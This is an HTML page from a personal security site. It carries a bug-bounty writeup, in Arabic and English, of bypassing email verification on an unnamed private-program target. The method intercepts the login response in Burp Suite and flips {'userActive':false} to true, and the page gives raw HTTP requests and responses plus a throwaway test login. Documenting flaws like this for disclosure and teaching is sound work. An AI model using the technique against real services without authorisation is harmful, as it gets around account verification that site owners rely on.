@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
+        <link rel="stylesheet" href="../../assets/css/styles.css">
+        <link rel="shortcut icon" type="image/png" href="../../assets/img/hacker.png">
+        <title>Response Manipulation</title>
+    </head>
+    <body>
+
+        <a href="#" class="scrolltop" id="scroll-top">
+            <i class='bx bx-chevron-up scrolltop__icon'></i>
+        </a>
+
+        <header class="l-header" id="header">
+            <nav class="nav bd-container">
+                <a href="../../index.html" class="nav__logo">Ahmed Hamza</a>
+
+                <div class="nav__menu" id="nav-menu">
+                    <ul class="nav__list">
+                        <li class="nav__item"><a href="../../index.html" class="nav__link">Home</a></li>
+                        <li class="nav__item"><a href="../writeups.html" class="nav__link active-link">Writeups</a></li>
+                        <li class="nav__item"><a href="../../tutorials/tutorials.html" class="nav__link">Tutorials</a></li>
+                        <li class="nav__item"><a href="../../it-project/it-project.html" class="nav__link">IT-Project</a></li>
+                        <li><i class='bx bx-moon change-theme' id="theme-button"></i></li>
+                    </ul>
+                </div>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class='bx bx-menu'></i>
+                </div>
+            </nav>
+        </header>
+
+        <main class="l-main">
+        <section class="menu section bd-container">
+        <h2 class="section-title">Response Manipulation</h2>
+        <div>   
+        
+        
+<pre class="code">
+ Title        : Bypass email verification and Login New Account Without Email Activate. 
+ Target       : target.com ... Private Program
+ Weakness     : Response Manipulation 
+ Status       : Duplicate
+ Date Of Scan : 2021-10-09 
+</pre>
+<br>
+<p dir="rtl">
+السلام عليكم , 
+<br>
+اكتشفت طريقة لتخطي عملية التحقق من تفعيل الحساب الجديد وتسجيل الدخول بنجاح من خلال التلاعب بالاستجابة.
+
+<br>
+<br>
+خطوات اكتشاف الثغرة :
+<br>
+1. انشاء حساب جديد في الموقع المصاب باستخدام الايميل والباسوورد
+<br>
+<br>
+<img src="pic/1.png" width="100%" height="350px">
+<br>
+<br>
+2. تسجيل الدخول الى الموقع المصاب باستخدام الايميل والباسوورد
+<br>
+ملاحظة: ستظهر رسالة خطأ بان الحساب غير مفعل ويجب تفعيل الحساب لتستطيع تسجيل الدخول
+<br>
+<br>
+<img src="pic/2.png" width="100%" height="350px">
+<br>
+<br>
+3. نقوم باستقبال الطلب باستخدام اداة burpsuite والتعديل على ال Response 
+<br>
+<br>
+<img src="pic/3.png" width="100%" height="400px">
+<br>
+<br>
+4. التعديل على الباراميتر userActive من False الى True
+<br>
+<br>
+<img src="pic/4.png" width="100%" height="400px">
+<br>
+<br>
+<br>
+<img src="pic/5.png" width="100%" height="400px">
+<br>
+<br>
+5. تسجيل الدخول بنجاح بدون عملية التحقق من تفعيل الحساب الجديد
+<br>
+<br>
+<img src="pic/6.png" width="100%" height="350px">
+<br>
+<br>
+<br>
+المراجع : 
+<br>
+</p>	
+<pre class="code">
+ <a href="https://hackerone.com/reports/1070510" target="_blank">https://hackerone.com/reports/1070510 </a> 
+ <a href="https://infosecwriteups.com/otp-bypass-via-response-manipulation-d5af09039fdf" target="_blank">https://infosecwriteups.com/otp-bypass-via-response-manipulation-d5af09039fdf</a>
+ <a href="https://infosecwriteups.com/another-admin-panel-e0489dc76678" target="_blank">https://infosecwriteups.com/another-admin-panel-e0489dc76678</a>
+ <a href="https://ashutoshmishra00x0.medium.com/account-takeover-via-response-manipulation-worth-1800-ffb242cc55c9" target="_blank">https://ashutoshmishra00x0.medium.com/account-takeover-via-response-manipulation-worth-1800-ffb242cc55c9 </a>
+ <a href="https://thevillagehacker.medium.com/account-take-over-by-response-manipulation-e1293ee51e9a" target="_blank">https://thevillagehacker.medium.com/account-take-over-by-response-manipulation-e1293ee51e9a</a>
+ <a href="https://gowthams.gitbook.io/bughunter-handbook/response-manipulation" target="_blank">https://gowthams.gitbook.io/bughunter-handbook/response-manipulation</a>
+</pre>
+<br>
+
+<h2 class="section-title">HackerOne Report</h2>
+
+<pre class="code">
+ <b>Title:</b> 
+ Bypass email verification and Login New Account Without Email Activate. 
+ 
+ <b>Description:</b>
+ I have found a way to ignore Activate your account and Login Successful by modifying the response.  
+ 
+ <b>Steps To Reproduce:</b>
+ 1. Sign up for new user using email id and password
+ 2. Go to https://app.target.com/login
+ 3. Now login with the creds 
+ 4. capture the request in burpsuite and intercept it's response.
+ 5. Change the false parameters to true --->   <b>{"userActive":false} TO {"userActive":true}</b>  
+ 6. Login Successful Without Activate account
+ 
+ 
+ <b>Request:</b>
+ 
+ POST /api/checkisuseractive HTTP/2
+ Host: app.target.com
+ Cookie: FRONTENDSESSID=; FRONTENDSESSID.sig=xxxxxxxxxxxx; PATIENTSESSID=
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0  
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: https://app.target.com/login
+ Content-Type: application/json
+ Authorization: Bearer undefined
+ Origin: https://app.target.com
+ Content-Length: 79
+ Te: trailers
+
+ {"emailAddress":"limog51239@nubenews.com","username":"limog51239@nubenews.com"}  
+
+
+ <b>Response:</b>
+
+ HTTP/2 200 OK
+ Content-Type: application/json; charset=utf-8
+ Content-Length: 20
+ Date: Sat, 09 Oct 2021 23:55:21 GMT
+ Strict-Transport-Security: max-age=31536000; includeSubDomains
+ X-Amzn-Remapped-Content-Length: 20
+ X-Amz-Apigw-Id: 
+ X-Powered-By: Express
+ X-Amzn-Trace-Id: 
+ X-Cache: Miss from cloudfront
+ X-Amz-Cf-Pop: 
+ X-Amz-Cf-Id: 
+
+ {"userActive":<b>false</b>}
+ 
+
+ <b>Response Manipulation:</b>
+  
+ HTTP/2 200 OK
+ Content-Type: application/json; charset=utf-8
+ Content-Length: 20
+ Date: Sat, 09 Oct 2021 23:55:21 GMT
+ X-Amzn-Requestid: 
+ Strict-Transport-Security: max-age=31536000; includeSubDomains
+ X-Amzn-Remapped-Content-Length: 20
+ X-Amz-Apigw-Id: 
+ X-Powered-By: Express
+ X-Amzn-Trace-Id: 
+ X-Cache: Miss from cloudfront
+ X-Amz-Cf-Pop: 
+ X-Amz-Cf-Id:
+
+ {"userActive":<b>true</b>}
+
+
+ <b>Login Successful:</b>
+
+ POST /api/loguserin HTTP/2
+ Host: app.target.com
+ Cookie:
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+ Accept: */*
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: https://app.target.com/login
+ Content-Type: application/json
+ Origin: https://app.target.com
+ Content-Length: 99
+ Te: trailers
+
+ {"logInFormPayload":{"usernameOrEmailAddress":"limog51239@nubenews.com","password":"Limog#51239@"}}  
+
+
+<b> Impact:</b>
+ An attacker can exploit this to bypass email verification.
+
+</pre>
+
+
+</div>
+
+</section>
+</main>
+
+
+<footer class="footer section bd-container">
+
+</footer>
+     
+<script src="https://unpkg.com/scrollreveal"></script>
+<script src="../../assets/js/main.js"></script>
+
+</body>
+</html>
